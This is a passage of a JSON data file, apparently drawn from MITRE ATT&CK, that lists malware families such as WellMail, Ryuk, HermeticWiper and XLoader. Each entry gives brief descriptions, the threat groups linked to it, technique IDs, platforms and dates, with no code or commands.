        "T1010",
        "T1027.011",
        "T1087.003",
        "T1082",
        "T1027.001",
        "T1218.007",
        "T1518.001",
        "T1562.001",
        "T1185",
        "T1562.004",
        "T1056.001",
        "T1070.004",
        "T1497.001",
        "T1115",
        "T1176.001",
        "T1140",
        "T1189",
        "T1548.002",
        "T1016",
        "T1106",
        "T1568.002",
        "T1071.001",
        "T1566.002",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0531",
      "stix_id": "malware--958b5d06-8bb0-4c5b-a2e7-0130fe654ac7",
      "created": "2020-11-10T21:13:44.259000+00:00",
      "modified": "2024-04-11T02:25:51.549000+00:00"
    },
    "S0515": {
      "id": "S0515",
      "name": "WellMail",
      "description": "[WellMail](https://attack.mitre.org/software/S0515) is a lightweight malware written in Golang used by [APT29](https://attack.mitre.org/groups/G0016), similar in design and structure to [WellMess](https://attack.mitre.org/software/S0514).(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1571",
        "T1560",
        "T1095",
        "T1033",
        "T1016",
        "T1140",
        "T1573.002",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0515",
      "stix_id": "malware--959f3b19-2dc8-48d5-8942-c66813a5101a",
      "created": "2020-09-29T17:48:27.517000+00:00",
      "modified": "2025-04-25T14:44:06.771000+00:00"
    },
    "S0513": {
      "id": "S0513",
      "name": "LiteDuke",
      "description": "[LiteDuke](https://attack.mitre.org/software/S0513) is a third stage backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016), primarily in 2014-2015. [LiteDuke](https://attack.mitre.org/software/S0513) used the same dropper as [PolyglotDuke](https://attack.mitre.org/software/S0518), and was found on machines also compromised by [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1082",
        "T1027.003",
        "T1016",
        "T1071.001",
        "T1012",
        "T1547.001",
        "T1070.004",
        "T1027.002",
        "T1105",
        "T1497.003",
        "T1518.001",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0513",
      "stix_id": "malware--95e2cbae-d82c-4f7b-b63c-16462015d35d",
      "created": "2020-09-24T17:51:35.005000+00:00",
      "modified": "2025-04-25T14:44:07.137000+00:00"
    },
    "S0188": {
      "id": "S0188",
      "name": "Starloader",
      "description": "[Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. (Citation: Symantec Sowbug Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0188",
      "stix_id": "malware--96566860-9f11-4b6f-964d-1c924e4f24a4",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:44:07.496000+00:00"
    },
    "S0074": {
      "id": "S0074",
      "name": "Sakula",
      "description": "[Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1105",
        "T1547.001",
        "T1071.001",
        "T1548.002",
        "T1573.001",
        "T1574.001",
        "T1059.003",
        "T1218.011",
        "T1543.003",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0074",
      "stix_id": "malware--96b08451-b27a-4ff6-893f-790e26393a8e",
      "created": "2017-05-31T21:32:48.482000+00:00",
      "modified": "2024-04-11T00:10:10.398000+00:00"
    },
    "S0636": {
      "id": "S0636",
      "name": "VaporRage",
      "description": "[VaporRage](https://attack.mitre.org/software/S0636) is a shellcode downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1480",
        "T1105",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0636",
      "stix_id": "malware--96eca9b9-b37f-42f1-96dc-a2c441403194",
      "created": "2021-08-04T15:02:56.965000+00:00",
      "modified": "2025-04-25T14:44:08.033000+00:00"
    },
    "S0169": {
      "id": "S0169",
      "name": "RawPOS",
      "description": "[RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.004",
        "T1560.003",
        "T1005",
        "T1074.001",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0169",
      "stix_id": "malware--9752aef4-a1f3-4328-929f-b64eb0536090",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:44:08.401000+00:00"
    },
    "S0589": {
      "id": "S0589",
      "name": "Sibot",
      "description": "[Sibot](https://attack.mitre.org/software/S0589) is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three [Sibot](https://attack.mitre.org/software/S0589) variants in early 2021 during its investigation of [APT29](https://attack.mitre.org/groups/G0016) and the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024).(Citation: MSTIC NOBELIUM Mar 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1053.005",
        "T1036.005",
        "T1016",
        "T1027.010",
        "T1047",
        "T1105",
        "T1070.004",
        "T1102",
        "T1059.005",
        "T1140",
        "T1218.005",
        "T1218.011",
        "T1049",
        "T1070",
        "T1027.011",
        "T1112",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0589",
      "stix_id": "malware--979adb5a-dc30-48f0-9e3d-9a26d866928c",
      "created": "2021-03-12T18:08:23.552000+00:00",
      "modified": "2025-04-16T20:38:25.040000+00:00"
    },
    "S1013": {
      "id": "S1013",
      "name": "ZxxZ",
      "description": "[ZxxZ](https://attack.mitre.org/software/S1013) is a trojan written in Visual C++ that has been used by [BITTER](https://attack.mitre.org/groups/G1002) since at least August 2021, including against Bangladeshi government personnel.(Citation: Cisco Talos Bitter Bangladesh May 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1105",
        "T1057",
        "T1082",
        "T1518.001",
        "T1036.004",
        "T1012",
        "T1027.013",
        "T1053.005",
        "T1204.002",
        "T1566.001",
        "T1033",
        "T1005",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1013",
      "stix_id": "malware--97cfbdc6-504d-41e9-a46c-78a9f806ff0d",
      "created": "2022-06-02T12:27:33.899000+00:00",
      "modified": "2024-04-10T20:29:50.729000+00:00"
    },
    "S1011": {
      "id": "S1011",
      "name": "Tarrask",
      "description": "[Tarrask](https://attack.mitre.org/software/S1011) is malware that has been used by [HAFNIUM](https://attack.mitre.org/groups/G0125) since at least August 2021. [Tarrask](https://attack.mitre.org/software/S1011) was designed to evade digital defenses and maintain persistence by generating concealed scheduled tasks.(Citation: Tarrask scheduled task)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1059.003",
        "T1134.001",
        "T1036.004",
        "T1053.005",
        "T1112",
        "T1564"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1011",
      "stix_id": "malware--988976ff-beeb-4fb5-b07d-ca7437ea66e8",
      "created": "2022-06-01T17:01:32.151000+00:00",
      "modified": "2025-04-16T20:38:25.204000+00:00"
    },
    "S1197": {
      "id": "S1197",
      "name": "GoBear",
      "description": "[GoBear](https://attack.mitre.org/software/S1197) is a Go-based backdoor that abuses legitimate, stolen certificates for defense evasion purposes. [GoBear](https://attack.mitre.org/software/S1197) is exclusively linked to [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: S2W Troll Stealer 2024)(Citation: Symantec Troll Stealer 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1036.005",
        "T1553.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1197",
      "stix_id": "malware--98943603-5be6-4551-8c98-bbaf0d229d39",
      "created": "2025-01-17T23:19:53.786000+00:00",
      "modified": "2025-01-17T23:38:02.063000+00:00"
    },
    "S0155": {
      "id": "S0155",
      "name": "WINDSHIELD",
      "description": "[WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1033",
        "T1012",
        "T1082",
        "T1070.004"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0155",
      "stix_id": "malware--98e8a977-3416-43aa-87fa-33e287e9c14c",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:44:09.479000+00:00"
    },
    "S0502": {
      "id": "S0502",
      "name": "Drovorub",
      "description": "[Drovorub](https://attack.mitre.org/software/S0502) is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by [APT28](https://attack.mitre.org/groups/G0007).(Citation: NSA/FBI Drovorub August 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1005",
        "T1027",
        "T1070.004",
        "T1547.006",
        "T1095",
        "T1014",
        "T1090.001",
        "T1059.004",
        "T1140",
        "T1041",
        "T1105"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0502",
      "stix_id": "malware--99164b38-1775-40bc-b77b-a2373b14540a",
      "created": "2020-08-25T18:05:14.953000+00:00",
      "modified": "2025-04-25T14:44:09.839000+00:00"
    },
    "S1019": {
      "id": "S1019",
      "name": "Shark",
      "description": "[Shark](https://attack.mitre.org/software/S1019) is a backdoor malware written in C# and .NET that is an updated version of [Milan](https://attack.mitre.org/software/S1015); it has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least July 2021.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1041",
        "T1027.013",
        "T1029",
        "T1012",
        "T1082",
        "T1059.003",
        "T1008",
        "T1005",
        "T1497.001",
        "T1036.005",
        "T1070.004",
        "T1140",
        "T1071.001",
        "T1071.004",
        "T1074",
        "T1568.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1019",
      "stix_id": "malware--99854cc8-f202-4e03-aa0a-4f8a4af93229",
      "created": "2022-06-10T19:45:53.538000+00:00",
      "modified": "2024-04-11T00:08:18.570000+00:00"
    },
    "S0534": {
      "id": "S0534",
      "name": "Bazar",
      "description": "[Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used since at least April 2020, with infections primarily against professional services, healthcare, manufacturing, IT, logistics and travel companies across the US and Europe. [Bazar](https://attack.mitre.org/software/S0534) reportedly has ties to [TrickBot](https://attack.mitre.org/software/S0266) campaigns and can be used to deploy additional malware, including ransomware, and to steal sensitive data.(Citation: Cybereason Bazar July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1482",
        "T1573.002",
        "T1087.002",
        "T1018",
        "T1204.001",
        "T1135",
        "T1055",
        "T1197",
        "T1059.003",
        "T1059.001",
        "T1027.013",
        "T1518.001",
        "T1497",
        "T1055.013",
        "T1070.009",
        "T1562.001",
        "T1005",
        "T1027.007",
        "T1614.001",
        "T1124",
        "T1057",
        "T1104",
        "T1012",
        "T1036.005",
        "T1518",
        "T1573.001",
        "T1547.004",
        "T1036.004",
        "T1016",
        "T1497.003",
        "T1033",
        "T1553.002",
        "T1070.004",
        "T1008",
        "T1071.001",
        "T1566.002",
        "T1105",
        "T1087.001",
        "T1053.005",
        "T1102",
        "T1036.007",
        "T1140",
        "T1047",
        "T1055.012",
        "T1106",
        "T1547.009",
        "T1547.001",
        "T1082",
        "T1027.002",
        "T1568.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0534",
      "stix_id": "malware--99fdf3b4-96ef-4ab9-b191-fc683441cad0",
      "created": "2020-11-18T19:07:48.008000+00:00",
      "modified": "2023-12-04T19:42:13.073000+00:00"
    },
    "S1108": {
      "id": "S1108",
      "name": "PULSECHECK",
      "description": "[PULSECHECK](https://attack.mitre.org/software/S1108) is a web shell written in Perl that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against Pulse Secure VPNs at US Defense Industrial Base (DIB) companies.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1059.004",
        "T1505.003",
        "T1132.001"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1108",
      "stix_id": "malware--9a097d18-d15f-4635-a4f1-189df7efdc40",
      "created": "2024-02-08T18:30:54.263000+00:00",
      "modified": "2025-04-15T19:46:34.866000+00:00"
    },
    "S0641": {
      "id": "S0641",
      "name": "Kobalos",
      "description": "[Kobalos](https://attack.mitre.org/software/S0641) is a multi-platform backdoor that can be used against Linux, FreeBSD, and Solaris. [Kobalos](https://attack.mitre.org/software/S0641) has been deployed against high profile targets, including high-performance computers, academic servers, an endpoint security vendor, and a large internet service provider; it has been found in Europe, North America, and Asia. [Kobalos](https://attack.mitre.org/software/S0641) was first identified in late 2019.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.004",
        "T1554",
        "T1016",
        "T1070.003",
        "T1074",
        "T1140",
        "T1205",
        "T1573.001",
        "T1048",
        "T1070.006",
        "T1027",
        "T1056",
        "T1573.002",
        "T1082",
        "T1090.003"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0641",
      "stix_id": "malware--9abdda30-08e0-4ab1-9cf0-d447654c6de9",
      "created": "2021-08-24T18:56:35.507000+00:00",
      "modified": "2025-04-25T14:44:10.741000+00:00"
    },
    "S0337": {
      "id": "S0337",
      "name": "BadPatch",
      "description": "[BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1071.003",
        "T1074.001",
        "T1071.001",
        "T1082",
        "T1113",
        "T1083",
        "T1497.001",
        "T1056.001",
        "T1105",
        "T1518.001",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0337",
      "stix_id": "malware--9af05de0-bc09-4511-a350-5eb8b06185c1",
      "created": "2019-01-29T21:33:34.082000+00:00",
      "modified": "2025-04-25T14:44:11.108000+00:00"
    },
    "S0443": {
      "id": "S0443",
      "name": "MESSAGETAP",
      "description": "[MESSAGETAP](https://attack.mitre.org/software/S0443) is a data mining malware family deployed by [APT41](https://attack.mitre.org/groups/G0096) into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords. (Citation: FireEye MESSAGETAP October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1040",
        "T1140",
        "T1074.001",
        "T1049",
        "T1560.003",
        "T1119",
        "T1083"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0443",
      "stix_id": "malware--9b19d6b4-cfcb-492f-8ca8-8449e7331573",
      "created": "2020-05-11T21:41:19.008000+00:00",
      "modified": "2025-04-25T14:44:11.465000+00:00"
    },
    "S0241": {
      "id": "S0241",
      "name": "RATANKBA",
      "description": "[RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. [RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1049",
        "T1059.003",
        "T1007",
        "T1071.001",
        "T1055.001",
        "T1047",
        "T1087.001",
        "T1057",
        "T1016",
        "T1018",
        "T1012",
        "T1105",
        "T1059.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0241",
      "stix_id": "malware--9b325b06-35a1-457d-be46-a4ecc0b7ff0c",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:11.826000+00:00"
    },
    "S1042": {
      "id": "S1042",
      "name": "SUGARDUMP",
      "description": "[SUGARDUMP](https://attack.mitre.org/software/S1042) is a proprietary browser credential harvesting tool that was used by UNC3890 during the [C0010](https://attack.mitre.org/campaigns/C0010) campaign. The first known [SUGARDUMP](https://attack.mitre.org/software/S1042) version was used since at least early 2021, a second SMTP C2 version was used from late 2021-early 2022, and a third HTTP C2 variant was used since at least April 2022.(Citation: Mandiant UNC3890 Aug 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1555.003",
        "T1041",
        "T1036.004",
        "T1518",
        "T1036.005",
        "T1074.001",
        "T1053.005",
        "T1217",
        "T1071.001",
        "T1204.002",
        "T1071.003",
        "T1560.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1042",
      "stix_id": "malware--9c10cede-c0bb-4c5c-91c0-8baec30abaf6",
      "created": "2022-09-21T21:02:02.388000+00:00",
      "modified": "2025-04-16T20:38:26.373000+00:00"
    },
    "S1207": {
      "id": "S1207",
      "name": "XLoader",
      "description": "[XLoader](https://attack.mitre.org/software/S1207) is an infostealer malware in use since at least 2016. Previously known and sometimes still referred to as Formbook, [XLoader](https://attack.mitre.org/software/S1207) is a Malware as a Service (MaaS) known for stealing data from web browsers, email clients and File Transfer Protocol (FTP) applications.(Citation: Zscaler XLoader 2025)(Citation: ANY.RUN XLoader 2023)(Citation: CheckPoint XLoader 2022)(Citation: Acronis XLoader 2021)(Citation: Google XLoader 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1555",
        "T1055.012",
        "T1562.001",
        "T1539",
        "T1027.013",
        "T1053.005",
        "T1059.010",
        "T1056.001",
        "T1070.004",
        "T1203",
        "T1497",
        "T1115",
        "T1106",
        "T1555.003",
        "T1566.001",
        "T1185",
        "T1529",
        "T1622",
        "T1140",
        "T1497.001",
        "T1071.001",
        "T1055.004",
        "T1033",
        "T1082",
        "T1583.001",
        "T1027.002",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1207",
      "stix_id": "malware--9c629607-03e4-4952-b481-2d54221d2783",
      "created": "2025-03-11T19:05:53.915000+00:00",
      "modified": "2025-03-11T19:54:25.962000+00:00"
    },
    "S0157": {
      "id": "S0157",
      "name": "SOUNDBITE",
      "description": "[SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1112",
        "T1071.004",
        "T1010",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0157",
      "stix_id": "malware--9ca488bd-9587-48ef-b923-1743523e63b2",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:44:12.545000+00:00"
    },
    "S0245": {
      "id": "S0245",
      "name": "BADCALL",
      "description": "[BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.004",
        "T1573.001",
        "T1001.003",
        "T1090",
        "T1112",
        "T1082",
        "T1571",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0245",
      "stix_id": "malware--9dbdadb6-fdbf-490f-a35f-38762d06a0d2",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:12.926000+00:00"
    },
    "S0071": {
      "id": "S0071",
      "name": "hcdLoader",
      "description": "[hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0071",
      "stix_id": "malware--9e2bba94-950b-4fcf-8070-cb3f816c5f4e",
      "created": "2017-05-31T21:32:46.890000+00:00",
      "modified": "2025-04-25T14:44:13.298000+00:00"
    },
    "S0118": {
      "id": "S0118",
      "name": "Nidiran",
      "description": "[Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic web compromise. (Citation: Symantec Suckfly March 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1036.004",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0118",
      "stix_id": "malware--9e9b9415-a7df-406b-b14d-92bfe6809fbe",
      "created": "2017-05-31T21:33:09.842000+00:00",
      "modified": "2025-04-16T20:38:27.055000+00:00"
    },
    "S0149": {
      "id": "S0149",
      "name": "MoonWind",
      "description": "[MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1057",
        "T1543.003",
        "T1571",
        "T1095",
        "T1083",
        "T1120",
        "T1573.001",
        "T1059.003",
        "T1082",
        "T1070.004",
        "T1124",
        "T1033",
        "T1074.001",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0149",
      "stix_id": "malware--9ea525fa-b0a9-4dde-84f2-bcea0137b3c1",
      "created": "2017-05-31T21:33:27.016000+00:00",
      "modified": "2025-04-25T14:44:13.834000+00:00"
    },
    "S0446": {
      "id": "S0446",
      "name": "Ryuk",
      "description": "[Ryuk](https://attack.mitre.org/software/S0446) is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018. [Ryuk](https://attack.mitre.org/software/S0446) shares code similarities with Hermes ransomware.(Citation: CrowdStrike Ryuk January 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: FireEye FIN6 Apr 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027",
        "T1562.001",
        "T1106",
        "T1057",
        "T1021.002",
        "T1083",
        "T1490",
        "T1614.001",
        "T1078.002",
        "T1059.003",
        "T1036.005",
        "T1489",
        "T1222.001",
        "T1053.005",
        "T1082",
        "T1205",
        "T1486",
        "T1055",
        "T1036",
        "T1547.001",
        "T1016",
        "T1134"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0446",
      "stix_id": "malware--a020a61c-423f-4195-8c46-ba1d21abba37",
      "created": "2020-05-13T20:14:53.171000+00:00",
      "modified": "2025-04-22T22:21:23.589000+00:00"
    },
    "S0498": {
      "id": "S0498",
      "name": "Cryptoistic",
      "description": "[Cryptoistic](https://attack.mitre.org/software/S0498) is a backdoor, written in Swift, that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032).(Citation: SentinelOne Lazarus macOS July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1573",
        "T1070.004",
        "T1083",
        "T1105",
        "T1095",
        "T1033"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0498",
      "stix_id": "malware--a04d9a4c-bb52-40bf-98ec-e350c2d6a862",
      "created": "2020-08-10T14:26:12.369000+00:00",
      "modified": "2025-04-25T14:44:14.409000+00:00"
    },
    "S0697": {
      "id": "S0697",
      "name": "HermeticWiper",
      "description": "[HermeticWiper](https://attack.mitre.org/software/S0697) is a data wiper that has been used since at least early 2022, primarily against Ukraine with additional activity observed in Latvia and Lithuania. Some sectors targeted include government, financial, defense, aviation, and IT services.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.006",
        "T1053.005",
        "T1134",
        "T1484.001",
        "T1485",
        "T1553.002",
        "T1112",
        "T1070",
        "T1083",
        "T1561.002",
        "T1490",
        "T1497.003",
        "T1140",
        "T1059.003",
        "T1082",
        "T1106",
        "T1027.015",
        "T1036.005",
        "T1543.003",
        "T1070.004",
        "T1489",
        "T1561.001",
        "T1569.002",
        "T1070.001",
        "T1529"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0697",
      "stix_id": "malware--a0ab8a96-40c9-4483-8a54-3fafa6d6007a",
      "created": "2022-03-25T18:30:08.906000+00:00",
      "modified": "2024-04-11T02:22:04.078000+00:00"
    },
    "S0469": {
      "id": "S0469",
      "name": "ABK",
      "description": "[ABK](https://attack.mitre.org/software/S0469) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1518.001",
        "T1140",
        "T1071.001",
        "T1055",
        "T1105",
        "T1027.003",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0469",
      "stix_id": "malware--a0ebedca-d558-4e48-8ff7-4bf76208d90c",
      "created": "2020-06-10T16:58:56.032000+00:00",
      "modified": "2025-04-25T14:44:14.945000+00:00"
    },
    "S0583": {
      "id": "S0583",
      "name": "Pysa",
      "description": "[Pysa](https://attack.mitre.org/software/S0583) is a ransomware that was first used in October 2018 and has been seen to target particularly high-value finance, government and healthcare organizations.(Citation: CERT-FR PYSA April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1059.006",
        "T1552.001",
        "T1562.001",
        "T1059.001",
        "T1486",
        "T1112",
        "T1021.001",
        "T1569.002",
        "T1003.001",
        "T1489",
        "T1490",
        "T1036.005",
        "T1110",
        "T1070.004",
        "T1046"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0583",
      "stix_id": "malware--a19c1197-9414-46e3-986f-0f609ff4a46b",
      "created": "2021-03-01T19:44:27.287000+00:00",
      "modified": "2025-04-25T14:44:15.316000+00:00"
    },
    "S0041": {
      "id": "S0041",
      "name": "Wiper",
      "description": "[Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. (Citation: Dell Wiper)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1072"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0041",
      "stix_id": "malware--a19c49aa-36fe-4c05-b817-23e1c7a7d085",
      "created": "2017-05-31T21:32:32.915000+00:00",
      "modified": "2025-04-25T14:44:15.681000+00:00"
    },
    "S0355": {
      "id": "S0355",
      "name": "Final1stspy",
      "description": "[Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1140",
        "T1027",
        "T1057",
        "T1082",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0355",
      "stix_id": "malware--a2282af0-f9dd-4373-9b92-eaf9e11e0c71",
      "created": "2019-01-31T00:23:06.022000+00:00",
      "modified": "2025-04-25T14:44:16.040000+00:00"
    },
    "S1146": {
      "id": "S1146",
      "name": "MgBot",
      "description": "[MgBot](https://attack.mitre.org/software/S1146) is a modular malware framework exclusively associated with [Daggerfly](https://attack.mitre.org/groups/G1034) operations since at least 2012. [MgBot](https://attack.mitre.org/software/S1146) was developed in C++ and features a module design with multiple available plugins that have been under active development through 2024.(Citation: Szappanos MgBot 2014)(Citation: ESET EvasivePanda 2023)(Citation: Symantec Daggerfly 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1033",
        "T1087.002",
        "T1003",
        "T1555",
        "T1087.001",
        "T1213",
        "T1555.003",
        "T1005",
        "T1025",
        "T1482",
        "T1115",
        "T1539",
        "T1018",
        "T1057",
        "T1046",
        "T1123"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1146",
      "stix_id": "malware--a36eedea-9523-4abb-96e8-205f171ee763",
      "created": "2024-07-25T18:16:57.099000+00:00",
      "modified": "2024-10-10T14:34:23.655000+00:00"
    },
    "S1043": {
